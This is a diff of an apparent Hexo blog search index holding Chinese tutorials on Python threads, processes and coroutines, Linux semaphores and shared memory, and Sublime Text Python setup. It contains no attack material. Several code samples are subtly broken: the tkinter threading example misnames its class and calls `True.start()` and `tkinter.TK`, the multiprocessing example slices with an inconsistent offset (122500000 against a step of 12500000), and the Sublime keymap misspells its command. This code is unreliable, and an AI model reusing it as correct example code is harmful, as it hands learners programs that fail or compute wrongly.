+<p>但是，切换作业是有代价的，比如从语文切到数学，要先收拾桌子上的语文书本、钢笔（这叫保存现场），然后，打开数学课本、找出圆规直尺（这叫准备新环境），才能开始做数学作业。操作系统在切换进程或者线程时也是一样的，它需要先保存当前执行的现场环境（CPU寄存器状态、内存页等），然后，把新任务的执行环境准备好（恢复上次的寄存器状态，切换内存页等），才能开始执行。这个切换过程虽然很快，但是也需要耗费时间。如果有几千个任务同时进行，操作系统可能就主要忙着切换任务，根本没有多少时间去执行任务了，这种情况最常见的就是硬盘狂响，点窗口无反应，系统处于假死状态。所以，多任务一旦多到一个限度，反而会使得系统性能急剧下降，最终导致所有任务都做不好。</p>
+<p>是否采用多任务的第二个考虑是任务的类型，可以把任务分为计算密集型和I/O密集型。计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如对视频进行编码解码或者格式转换等等，这种任务全靠CPU的运算能力，虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低。计算密集型任务由于主要消耗CPU资源，这类任务用Python这样的脚本语言去执行效率通常很低，最能胜任这类任务的是C语言，我们之前提到了Python中有嵌入C/C++代码的机制。</p>
+<p>除了计算密集型任务，其他的涉及到网络、存储介质I/O的任务都可以视为I/O密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待I/O操作完成（因为I/O的速度远远低于CPU和内存的速度）。对于I/O密集型任务，如果启动多任务，就可以减少I/O等待时间从而让CPU高效率的运转。</p>
+<h2 id="单线程-异步I-O"><a href="#单线程-异步I-O" class="headerlink" title="单线程+异步I/O"></a>单线程+异步I/O</h2><p>现代操作系统对I/O操作的改进中最为重要的就是支持异步I/O。如果充分利用操作系统提供的异步I/O支持，就可以用单进程单线程模型来执行多任务，这种全新的模型称为事件驱动模型。Nginx就是支持异步I/O的Web服务器，它在单核CPU上采用单进程模型就可以高效地支持多任务。在多核CPU上，可以运行多个进程（数量与CPU核心数相同），充分利用多核CPU。</p>
+<p>在Python语言中，单线程+异步I/O的编程模型称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。协程最大的优势就是极高的执行效率，因为子程序切换不是线程切换，而是由程序自身控制，因此，没有线程切换的开销。协程的第二个优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在协程中控制共享资源不用加锁，只需要判断状态就好了，所以执行效率比多线程高很多。如果想要充分利用CPU的多核特性，最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率，可获得极高的性能。</p>
+<h3 id="例1：将耗时间的任务放到线程中以获得更好的用户体验"><a href="#例1：将耗时间的任务放到线程中以获得更好的用户体验" class="headerlink" title="例1：将耗时间的任务放到线程中以获得更好的用户体验"></a>例1：将耗时间的任务放到线程中以获得更好的用户体验</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">import <span class="selector-tag">time</span></span><br><span class="line">import tkinter</span><br><span class="line">import tkinter<span class="selector-class">.messagebox</span></span><br><span class="line"><span class="selector-tag">from</span> threading import Thread</span><br><span class="line"></span><br><span class="line">def <span class="selector-tag">main</span>():</span><br><span class="line">    class <span class="built_in">DownloadTaskHandler</span>(Thread):</span><br><span class="line">        def <span class="built_in">run</span>(self):</span><br><span class="line">            time.<span class="built_in">sleep</span>(<span class="number">10</span>)</span><br><span class="line">            tkinter.messagebox.<span class="built_in">showinfo</span>(<span class="string">&#x27;提示&#x27;</span>,<span class="string">&#x27;下载完成！&#x27;</span>)</span><br><span class="line">            # 启用下载按钮</span><br><span class="line">            button1.<span class="built_in">config</span>(state = tkinter.NORMAL)</span><br><span class="line">    def <span class="built_in">download</span>():</span><br><span class="line">        # 禁用下载按钮</span><br><span class="line">        button1.<span class="built_in">config</span>(state = tkinter.DISABLED)</span><br><span class="line">        # 通过daemon参数将参数设置为守护线程（主程序退出就不再保留执行）</span><br><span class="line">        # 在线程中处理耗时间的下载任务</span><br><span class="line">        <span class="built_in">DownLoadTaskHandler</span>(daemon=True.<span class="built_in">start</span>())</span><br><span class="line">    def <span class="built_in">show_about</span>():</span><br><span class="line">        tkinter.messagebox.<span class="built_in">showinfo</span>(<span class="string">&#x27;关于&#x27;</span>,<span class="string">&#x27;作者：张三&#x27;</span>)</span><br><span class="line">    top = tkinter.<span class="built_in">TK</span>()</span><br><span class="line">    top.<span class="built_in">title</span>(<span class="string">&#x27;单线程&#x27;</span>)</span><br><span class="line">    top.<span class="built_in">geometry</span>(<span class="string">&#x27;200×150&#x27;</span>)</span><br><span class="line">    top.<span class="built_in">wm_attributes</span>(<span class="string">&#x27;-topmost&#x27;</span>,True)</span><br><span class="line">    panel = tkinter.<span class="built_in">Frame</span>(top)</span><br><span class="line">    button1 = tkinter.<span class="built_in">Button</span>(panel,text=<span class="string">&#x27;下载&#x27;</span>,command=download)</span><br><span class="line">    button1.<span class="built_in">pack</span>(side=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">    button2 = tkinter.<span class="built_in">Button</span>(panel,text=<span class="string">&#x27;关于&#x27;</span>,command=show_about)</span><br><span class="line">    button2.<span class="built_in">pack</span>(side=<span class="string">&#x27;right&#x27;</span>)</span><br><span class="line">    panel.<span class="built_in">pack</span>(side=<span class="string">&#x27;bottom&#x27;</span>)</span><br><span class="line">    tkinter.<span class="built_in">mainloop</span>()</span><br><span class="line">if __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">main</span>()</span><br></pre></td></tr></table></figure>
+<h3 id="例2：使用多进程对复杂任务进行“分而治之”"><a href="#例2：使用多进程对复杂任务进行“分而治之”" class="headerlink" title="例2：使用多进程对复杂任务进行“分而治之”"></a>例2：使用多进程对复杂任务进行“分而治之”</h3><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">from</span> multiprocessing import Process,Queue</span><br><span class="line"><span class="meta">from</span> random import randint</span><br><span class="line"><span class="meta">from</span> time import time</span><br><span class="line"></span><br><span class="line">def task_handler(curr_list,result_queue):</span><br><span class="line">    total = 0</span><br><span class="line">    for number <span class="meta">in</span> curr_list:</span><br><span class="line">        total += number</span><br><span class="line">    result_queue<span class="meta">.put(</span>total)</span><br><span class="line">def ma<span class="meta">in(</span>):</span><br><span class="line">    processes = []</span><br><span class="line">    number_lisst = [<span class="meta">x</span> for <span class="meta">x</span> <span class="meta">in</span><span class="meta"> range(</span>1,100000001)]</span><br><span class="line">    result_queue = Queue()</span><br><span class="line">    <span class="meta">index</span> = 0</span><br><span class="line">    # 启动8个进程将数据切片后进行运算</span><br><span class="line">    for _ <span class="meta">in</span><span class="meta"> range(</span>8):</span><br><span class="line">        p = Process(target=task_handler,args=(number_lisst[<span class="meta">index</span>:<span class="meta">index</span>+122500000],result_queue))</span><br><span class="line">        <span class="meta">index</span> += 12500000</span><br><span class="line">        processes.append(p)</span><br><span class="line">        p.start()</span><br><span class="line">    # 开始记录所有进程执行完成花费的时间</span><br><span class="line">    start =<span class="meta"> time(</span>)</span><br><span class="line">    for p <span class="meta">in</span> processes:</span><br><span class="line">        p.jo<span class="meta">in(</span>)</span><br><span class="line">    # 合并执行结果</span><br><span class="line">    total = 0</span><br><span class="line">    <span class="meta">while</span> <span class="meta">not</span> result_queue.empty():</span><br><span class="line">        total += result_queue.get()</span><br><span class="line">    p<span class="meta">rint(</span>total)</span><br><span class="line">    <span class="meta">end</span> =<span class="meta"> time(</span>)</span><br><span class="line">    p<span class="meta">rint(</span><span class="string">&#x27;Execution time:&#x27;</span>,(<span class="meta">end</span>-start),<span class="string">&#x27;s&#x27;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ma<span class="meta">in(</span>)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>Python-100days</tag>
       </tags>
   </entry>
   <entry>
@@ -1023,42 +1023,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux进程间通信——信号量</title>
-    <url>/2020/10/29/Linux%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E2%80%94%E2%80%94%E4%BF%A1%E5%8F%B7%E9%87%8F/</url>
-    <content><![CDATA[<h2 id="Linux进程间通信——信号量"><a href="#Linux进程间通信——信号量" class="headerlink" title="Linux进程间通信——信号量"></a>Linux进程间通信——信号量</h2><h3 id="信号量简介"><a href="#信号量简介" class="headerlink" title="信号量简介"></a>信号量简介</h3><h4 id="为什么需要信号量"><a href="#为什么需要信号量" class="headerlink" title="为什么需要信号量"></a>为什么需要信号量</h4><p>为了防止出现因多个程序同时访问一个共享资源而引发的一系列问题，我们需要一种方法，它可以通过生成并使用令牌来授权，在任一时刻只能有一个执行线程访问代码的临界区域。临界区域是指执行数据更新的代码需要独占式地执行。而信号量就可以提供这样的一种访问机制，让一个临界区同一时间只有一个线程在访问它，也就是说信号量是用来调协进程对共享资源的访问的。<br><span id="more"></span><br>信号量是一种特殊的变量，访问具有原子性。</p>
-<p>只允许对它进行两个操作：</p>
-<p>1) 等待信号量</p>
-<p>当信号量值为0时，程序等待；当信号量值大于0时，信号量减1，程序继续运行。</p>
-<p>2) 发送信号量</p>
-<p>将信号量值加1。</p>
-<h4 id="信号量的工作原理"><a href="#信号量的工作原理" class="headerlink" title="信号量的工作原理"></a>信号量的工作原理</h4><p>由于信号量只能进行两种操作等待和发送信号，即P(sv)和V(sv),他们的行为是这样的：<br>P(sv)：如果sv的值大于零，就给它减1；如果它的值为零，就挂起该进程的执行<br>V(sv)：如果有其他进程因等待sv而被挂起，就让它恢复运行，如果没有进程因等待sv而挂起，就给它加1.</p>
-<p>举个例子，就是两个进程共享信号量sv，一旦其中一个进程执行了P(sv)操作，它将得到信号量，并可以进入临界区，使sv减1。而第二个进程将被阻止进入临界区，因为当它试图执行P(sv)时，sv为0，它会被挂起以等待第一个进程离开临界区域并执行V(sv)释放信号量，这时第二个进程就可以恢复执行。</p>
-<h3 id="信号量使用"><a href="#信号量使用" class="headerlink" title="信号量使用"></a>信号量使用</h3><p>Linux提供了一组精心设计的信号量接口来对信号进行操作，它们不只是针对二进制信号量，下面将会对这些函数进行介绍，但请注意，这些函数都是用来对成组的信号量值进行操作的。它们声明在头文件sys/sem.h中。</p>
-<h4 id="semget函数"><a href="#semget函数" class="headerlink" title="semget函数"></a>semget函数</h4><p>它的作用是创建一个新信号量或取得一个已有信号量，原型为：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semget</span><span class="params">(<span class="keyword">key_t</span> key,<span class="keyword">int</span> num_sems,<span class="keyword">int</span> sem_flags)</span></span>;</span><br></pre></td></tr></table></figure>
-<p><strong>key:</strong> 整数值（唯一非零），<br>不相关的进程可以通过它访问一个信号量，它代表程序可能要使用的某个资源，程序对所有信号量的访问都是间接的，程序先通过调用semget函数并提供一个键，再由系统生成一个相应的信号标识符（semget函数的返回值），只有semget函数才直接使用信号量键，所有其他的信号量函数使用由semget函数返回的信号量标识符。如果多个程序使用相同的key值，key将负责协调工作。</p>
-<p><strong>num_sems:</strong> 指定需要的信号量数目，值几乎总是1。</p>
-<p><strong>sem_flags:</strong> 是一组标志，当想要当信号量不存在时创建一个新的信号量，可以和值IPC_CREAT做按位或操作。设置了IPC_CREAT标志后，即使给出的键是一个已有信号量的键，也不会产生错误。而IPC_CREAT | IPC_EXCL则可以创建一个新的，唯一的信号量，如果信号量已存在，返回一个错误。</p>
-<p>semget函数成功返回一个相应信号标识符（非零），失败返回-1.</p>
-<h4 id="semop函数"><a href="#semop函数" class="headerlink" title="semop函数"></a>semop函数</h4><p>它的作用是改变信号量的值，原型为：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semop</span><span class="params">(<span class="keyword">int</span> sem_id,struct sembuf *sem_opa,<span class="keyword">size_t</span> num_sem_ops)</span></span>;</span><br></pre></td></tr></table></figure>
-<p><strong>sem_id:</strong> 由semget返回的信号量标识符<strong>sembuf:</strong> 结构如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span>&#123;</span></span><br><span class="line">    <span class="keyword">short</span> sem_num;<span class="comment">//除非使用一组信号量，否则它为0</span></span><br><span class="line">    <span class="keyword">short</span> sem_op;<span class="comment">//信号量在一次操作中需要改变的数据，通常是两个数，一个是-1，即P（等待）操作</span></span><br><span class="line">    <span class="comment">//一个是+1，即V（发送信号）操作</span></span><br><span class="line">    <span class="keyword">short</span> sem_flg;<span class="comment">//通常SEM_UNDO，使操作系统跟踪信号</span></span><br><span class="line">    <span class="comment">//并在进程没有释放信号量终止时，操作系统释放信号量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p><strong>num_sem_ops:</strong> 进行操作信号量的个数，即sops结构变量的个数，需大于或等于1.此值常等于1，只完成对一个信号量的操作。</p>
-<p>semop函数成功返回信号量集的标识符，错误返回-1；</p>
-<h4 id="semctl函数"><a href="#semctl函数" class="headerlink" title="semctl函数"></a>semctl函数</h4><p>该函数用来直接控制信号量信息，它的原型为：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semctl</span><span class="params">(<span class="keyword">int</span> sem_id,<span class="keyword">int</span> sem_num,<span class="keyword">int</span> command,[<span class="keyword">union</span> semun sem_union])</span></span>;</span><br></pre></td></tr></table></figure>
-<p><strong>sem_id:</strong> 信号量集标识符<br><strong>sem_mum:</strong> 信号量集数组上的下标，表示某一个信号量<br><strong>command:</strong> 有两个值SETVAL,IPC_RMID，分别表示初始化和删除信号量。</p>
-<p>如果有第四个参数，它通常是一个union semum结构，定义如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">semun</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">semid_ds</span> *<span class="title">buf</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> *arry;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>一般用到的是val,表示要传给信号量的初始值。</p>
-<p>semct函数成功返回大于或等于0，失败返回-1</p>
-]]></content>
-      <tags>
-        <tag>Linux进程间通信</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux进程间通信——共享内存</title>
     <url>/2020/10/29/Linux%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E2%80%94%E2%80%94%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98/</url>
     <content><![CDATA[<h2 id="Linux进程间通信——共享内存"><a href="#Linux进程间通信——共享内存" class="headerlink" title="Linux进程间通信——共享内存"></a>Linux进程间通信——共享内存</h2><h3 id="共享内存简介"><a href="#共享内存简介" class="headerlink" title="共享内存简介"></a>共享内存简介</h3><h4 id="什么是共享内存"><a href="#什么是共享内存" class="headerlink" title="什么是共享内存"></a>什么是共享内存</h4><p>共享内存就是允许两个不相关的进程访问同一个逻辑内存。共享内存是在两个正在运行的进程之间共享和传递数据的一种非常有效的方式。不同进程之间共享的内存通常安排为同一段物理内存。进程可以将同一段共享内存连接到它们自己的地址空间中，所有进程都可以访问共享内存中的地址，就好像它们是由用C语言函数malloc()分配的内存一样。而如果某个进程向共享内存写入数据，所做的改动将立即影响到可以访问同一段共享内存的任何其他进程。<br><span id="more"></span><br>特别提醒：共享内存并未提供同步机制，也就是说，在第一个进程结束对共享内存的写操作之前，并无自动机制可以阻止第二个进程开始对它进行读取。所以我们通常需要用其他的机制来同步对共享内存的访问，例如信号量。</p>
@@ -1091,6 +1055,42 @@
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shmid_ds</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uid_t</span> shm_perm.uid;</span><br><span class="line">    <span class="keyword">uid_t</span> shm_perm.git;</span><br><span class="line">    <span class="keyword">mode_t</span> shm_perm.mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <h3 id="使用共享内存的优缺点"><a href="#使用共享内存的优缺点" class="headerlink" title="使用共享内存的优缺点"></a>使用共享内存的优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>使用共享内存进行进程间的通信非常方便，而且函数的接口也简单，数据的共享还使进程间的数据不用传送，而是直接访问内存，也加快了程序的效率。同时，它也不像匿名管道那样要求通信的进程有一定的父子关系。</p>
 <h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>共享内存没有提供同步的机制，这使得我们在使用共享内存进行进程间通信时，往往要借助其他的手段来进行进程间的同步工作。</p>
+]]></content>
+      <tags>
+        <tag>Linux进程间通信</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux进程间通信——信号量</title>
+    <url>/2020/10/29/Linux%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E2%80%94%E2%80%94%E4%BF%A1%E5%8F%B7%E9%87%8F/</url>
+    <content><![CDATA[<h2 id="Linux进程间通信——信号量"><a href="#Linux进程间通信——信号量" class="headerlink" title="Linux进程间通信——信号量"></a>Linux进程间通信——信号量</h2><h3 id="信号量简介"><a href="#信号量简介" class="headerlink" title="信号量简介"></a>信号量简介</h3><h4 id="为什么需要信号量"><a href="#为什么需要信号量" class="headerlink" title="为什么需要信号量"></a>为什么需要信号量</h4><p>为了防止出现因多个程序同时访问一个共享资源而引发的一系列问题，我们需要一种方法，它可以通过生成并使用令牌来授权，在任一时刻只能有一个执行线程访问代码的临界区域。临界区域是指执行数据更新的代码需要独占式地执行。而信号量就可以提供这样的一种访问机制，让一个临界区同一时间只有一个线程在访问它，也就是说信号量是用来调协进程对共享资源的访问的。<br><span id="more"></span><br>信号量是一种特殊的变量，访问具有原子性。</p>
+<p>只允许对它进行两个操作：</p>
+<p>1) 等待信号量</p>
+<p>当信号量值为0时，程序等待；当信号量值大于0时，信号量减1，程序继续运行。</p>
+<p>2) 发送信号量</p>
+<p>将信号量值加1。</p>
+<h4 id="信号量的工作原理"><a href="#信号量的工作原理" class="headerlink" title="信号量的工作原理"></a>信号量的工作原理</h4><p>由于信号量只能进行两种操作等待和发送信号，即P(sv)和V(sv),他们的行为是这样的：<br>P(sv)：如果sv的值大于零，就给它减1；如果它的值为零，就挂起该进程的执行<br>V(sv)：如果有其他进程因等待sv而被挂起，就让它恢复运行，如果没有进程因等待sv而挂起，就给它加1.</p>
+<p>举个例子，就是两个进程共享信号量sv，一旦其中一个进程执行了P(sv)操作，它将得到信号量，并可以进入临界区，使sv减1。而第二个进程将被阻止进入临界区，因为当它试图执行P(sv)时，sv为0，它会被挂起以等待第一个进程离开临界区域并执行V(sv)释放信号量，这时第二个进程就可以恢复执行。</p>
+<h3 id="信号量使用"><a href="#信号量使用" class="headerlink" title="信号量使用"></a>信号量使用</h3><p>Linux提供了一组精心设计的信号量接口来对信号进行操作，它们不只是针对二进制信号量，下面将会对这些函数进行介绍，但请注意，这些函数都是用来对成组的信号量值进行操作的。它们声明在头文件sys/sem.h中。</p>
+<h4 id="semget函数"><a href="#semget函数" class="headerlink" title="semget函数"></a>semget函数</h4><p>它的作用是创建一个新信号量或取得一个已有信号量，原型为：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semget</span><span class="params">(<span class="keyword">key_t</span> key,<span class="keyword">int</span> num_sems,<span class="keyword">int</span> sem_flags)</span></span>;</span><br></pre></td></tr></table></figure>
+<p><strong>key:</strong> 整数值（唯一非零），<br>不相关的进程可以通过它访问一个信号量，它代表程序可能要使用的某个资源，程序对所有信号量的访问都是间接的，程序先通过调用semget函数并提供一个键，再由系统生成一个相应的信号标识符（semget函数的返回值），只有semget函数才直接使用信号量键，所有其他的信号量函数使用由semget函数返回的信号量标识符。如果多个程序使用相同的key值，key将负责协调工作。</p>
+<p><strong>num_sems:</strong> 指定需要的信号量数目，值几乎总是1。</p>
+<p><strong>sem_flags:</strong> 是一组标志，当想要当信号量不存在时创建一个新的信号量，可以和值IPC_CREAT做按位或操作。设置了IPC_CREAT标志后，即使给出的键是一个已有信号量的键，也不会产生错误。而IPC_CREAT | IPC_EXCL则可以创建一个新的，唯一的信号量，如果信号量已存在，返回一个错误。</p>
+<p>semget函数成功返回一个相应信号标识符（非零），失败返回-1.</p>
+<h4 id="semop函数"><a href="#semop函数" class="headerlink" title="semop函数"></a>semop函数</h4><p>它的作用是改变信号量的值，原型为：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semop</span><span class="params">(<span class="keyword">int</span> sem_id,struct sembuf *sem_opa,<span class="keyword">size_t</span> num_sem_ops)</span></span>;</span><br></pre></td></tr></table></figure>
+<p><strong>sem_id:</strong> 由semget返回的信号量标识符<strong>sembuf:</strong> 结构如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span>&#123;</span></span><br><span class="line">    <span class="keyword">short</span> sem_num;<span class="comment">//除非使用一组信号量，否则它为0</span></span><br><span class="line">    <span class="keyword">short</span> sem_op;<span class="comment">//信号量在一次操作中需要改变的数据，通常是两个数，一个是-1，即P（等待）操作</span></span><br><span class="line">    <span class="comment">//一个是+1，即V（发送信号）操作</span></span><br><span class="line">    <span class="keyword">short</span> sem_flg;<span class="comment">//通常SEM_UNDO，使操作系统跟踪信号</span></span><br><span class="line">    <span class="comment">//并在进程没有释放信号量终止时，操作系统释放信号量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>num_sem_ops:</strong> 进行操作信号量的个数，即sops结构变量的个数，需大于或等于1.此值常等于1，只完成对一个信号量的操作。</p>
+<p>semop函数成功返回信号量集的标识符，错误返回-1；</p>
+<h4 id="semctl函数"><a href="#semctl函数" class="headerlink" title="semctl函数"></a>semctl函数</h4><p>该函数用来直接控制信号量信息，它的原型为：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semctl</span><span class="params">(<span class="keyword">int</span> sem_id,<span class="keyword">int</span> sem_num,<span class="keyword">int</span> command,[<span class="keyword">union</span> semun sem_union])</span></span>;</span><br></pre></td></tr></table></figure>
+<p><strong>sem_id:</strong> 信号量集标识符<br><strong>sem_mum:</strong> 信号量集数组上的下标，表示某一个信号量<br><strong>command:</strong> 有两个值SETVAL,IPC_RMID，分别表示初始化和删除信号量。</p>
+<p>如果有第四个参数，它通常是一个union semum结构，定义如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">semun</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">semid_ds</span> *<span class="title">buf</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> *arry;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>一般用到的是val,表示要传给信号量的初始值。</p>
+<p>semct函数成功返回大于或等于0，失败返回-1</p>
 ]]></content>
       <tags>
         <tag>Linux进程间通信</tag>
@@ -1976,6 +1976,44 @@
       </tags>
   </entry>
   <entry>
+    <title>Sublime Text3 配置pyhon环境</title>
+    <url>/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h3 id="Sublime-Text3-配置python环境详解。"><a href="#Sublime-Text3-配置python环境详解。" class="headerlink" title="Sublime Text3 配置python环境详解。"></a>Sublime Text3 配置python环境详解。</h3><span id="more"></span>
+<h4 id="Sublime-Text3配置python环境"><a href="#Sublime-Text3配置python环境" class="headerlink" title="Sublime Text3配置python环境"></a>Sublime Text3配置python环境</h4><p>安装参考以前文章，下面说配置</p>
+<p>打开安装好的 sublime text 3，选择编译环境<br><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython01.png" alt="0e3b5e9cfb36e436416f187edb061fd0.png"></p>
+<p>然后输入</p>
+<blockquote>
+<p>print(“你好”)</p>
+</blockquote>
+<p>然后保存为.py后缀文件</p>
+<p>回到主界面，Ctrl+B运行</p>
+<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython02.png" alt="89d3fe035435cc1dc56fff80ffd225fc.png"></p>
+<p>中文成功输出，证明配置好了，但还需要按一个插件来支持 input</p>
+<p>安装SublimeREPL插件，使Sublime支持input</p>
+<p>安装好，试着调用。</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">num</span> = <span class="function"><span class="title">input</span>(<span class="string">&quot;今天几月几日:&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="title">print</span>(<span class="variable">num</span>)</span></span><br></pre></td></tr></table></figure>
+<p>跟 Ctrl+B 直接编译不同，利用插件来编译需要先手动 Ctrl+S 保存</p>
+<p><strong>常规调用：</strong></p>
+<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython03.png" alt="69d5a1b9e9dfe5c1aff1d2e1e1775f36.png"></p>
+<p>然后弹出一个新的框，进行输入输出。</p>
+<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython04.png" alt="fbe8fc6a38764b3605c069357dafdf37.png"></p>
+<p><strong>设置快捷键调用：</strong></p>
+<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython05.png" alt="ded30527af9e541ca4cf0e79bf907cf2.png"></p>
+<p>左边是系统默认设置，我们在右边窗口输入以下设置（另一个 Alt + End 是终止编译的快捷键），Ctrl+S 保存</p>
+<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython06.png" alt="bc715187792b855d583c10db6cc44403.png"></p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[ </span><br><span class="line"><span class="code">    &#123; </span></span><br><span class="line"><span class="code">        &quot;keys&quot;: [&quot;f4&quot;], </span></span><br><span class="line"><span class="code">        &quot;caption&quot;: &quot;SublimeREPL: Python - RUN current file&quot;, </span></span><br><span class="line"><span class="code">        &quot;command&quot;: &quot;run_existing_windoww_command&quot;, </span></span><br><span class="line"><span class="code">        &quot;args&quot;: &#123; </span></span><br><span class="line"><span class="code">            &quot;id&quot;: &quot;repl_python_run&quot;, </span></span><br><span class="line"><span class="code">            &quot;file&quot;: &quot;config/Python/Main.sublime-menu&quot;</span></span><br><span class="line"><span class="code">        &#125; </span></span><br><span class="line"><span class="code">    &#125;,</span></span><br><span class="line"><span class="code">        &#123; </span></span><br><span class="line"><span class="code">            &quot;keys&quot;: [&quot;alt+end&quot;], </span></span><br><span class="line"><span class="code">            &quot;command&quot;: &quot;exec&quot;, </span></span><br><span class="line"><span class="code">            &quot;args&quot;: &#123;&quot;kill&quot;: true&#125; </span></span><br><span class="line"><span class="code">        &#125; </span></span><br><span class="line"><span class="code">]</span></span><br></pre></td></tr></table></figure>
+<p>切换不方便，可以打开两个视图：</p>
+<p><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython07.png" alt="c33682bb046be44ffbe99139d83ea249.png"></p>
+<p>本文参考：<br>链接：<a href="https://www.zhihu.com/question/22904994/answer/800236870">https://www.zhihu.com/question/22904994/answer/800236870</a></p>
+]]></content>
+      <categories>
+        <category>软件安装</category>
+      </categories>
+      <tags>
+        <tag>软件安装</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Sublime Text3 Markdown插件</title>
     <url>/2020/03/13/Sublime-Text3-Markdown%E6%8F%92%E4%BB%B6/</url>
     <content><![CDATA[<h3 id="Sublime-Text3-Markdown插件推荐"><a href="#Sublime-Text3-Markdown插件推荐" class="headerlink" title="Sublime Text3 Markdown插件推荐"></a>Sublime Text3 Markdown插件推荐</h3><span id="more"></span>
@@ -2047,44 +2085,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Sublime Text3 配置pyhon环境</title>
-    <url>/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<h3 id="Sublime-Text3-配置python环境详解。"><a href="#Sublime-Text3-配置python环境详解。" class="headerlink" title="Sublime Text3 配置python环境详解。"></a>Sublime Text3 配置python环境详解。</h3><span id="more"></span>
-<h4 id="Sublime-Text3配置python环境"><a href="#Sublime-Text3配置python环境" class="headerlink" title="Sublime Text3配置python环境"></a>Sublime Text3配置python环境</h4><p>安装参考以前文章，下面说配置</p>
-<p>打开安装好的 sublime text 3，选择编译环境<br><img src="/2020/03/13/Sublime-Text3-%E9%85%8D%E7%BD%AEpyhon%E7%8E%AF%E5%A2%83/SublimePython01.png" alt="0e3b5e9cfb36e436416f187edb061fd0.png"></p>
-<p>然后输入</p>
-<blockquote>
-<p>print(“你好”)</p>
-</blockquote>
-<p>然后保存为.py后缀文件</p>
-<p>回到主界面，Ctrl+B运行</p>
